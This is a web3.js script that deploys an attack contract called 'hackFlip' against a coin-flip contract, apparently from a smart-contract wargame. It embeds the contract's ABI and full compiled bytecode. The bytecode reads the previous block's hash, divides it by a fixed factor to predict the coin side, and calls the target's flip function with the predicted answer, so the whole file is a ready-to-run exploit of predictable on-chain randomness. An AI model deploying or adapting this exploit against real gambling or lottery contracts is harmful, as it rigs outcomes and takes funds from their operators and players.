var _flipper = contract.address
var hackflipContract = web3.eth.contract([
  {
    constant: true,
    inputs: [],
    name: "FACTOR",
    outputs: [{ name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "flipper",
    outputs: [{ name: "", type: "address" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  },
  {
    constant: false,
    inputs: [],
    name: "hackFlip",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function"
  },
  {
    inputs: [{ name: "_flipper", type: "address" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "constructor"
  }
])
var hackFlip = hackflipContract.new(
  _flipper,
  {
    from: web3.eth.accounts[0],
    data:
      "0x60606040527f8000000000000000000000000000000000000000000000000000000000000000600055341561003357600080fd5b6040516020806102d98339810160405280805190602001909190505080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610239806100a06000396000f300606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806335815b951461005c57806343aafcc8146100855780635d5d4559146100da575b600080fd5b341561006757600080fd5b61006f6100ef565b6040518082815260200191505060405180910390f35b341561009057600080fd5b6100986100f5565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156100e557600080fd5b6100ed61011b565b005b60005481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080600060014303406001900492506000548381151561013857fe5b0491506001821461014a57600061014d565b60015b9050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826000604051602001526040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082151515158152602001915050602060405180830381600087803b15156101ec57600080fd5b6102c65a03f115156101fd57600080fd5b50505060405180519050505050505600a165627a7a72305820c55828fd26c4def7284c24042e15caa71e02a45fbae6793b0865fbed278cad6d0029",
    gas: "4700000"
  },
  function(e, contract) {
    console.info(e, contract)
    if (typeof contract.address !== "undefined") {
      console.info(
        "Contract mined! address: " + contract.address + " transactionHash: " + contract.transactionHash
      )
    }
  }
)
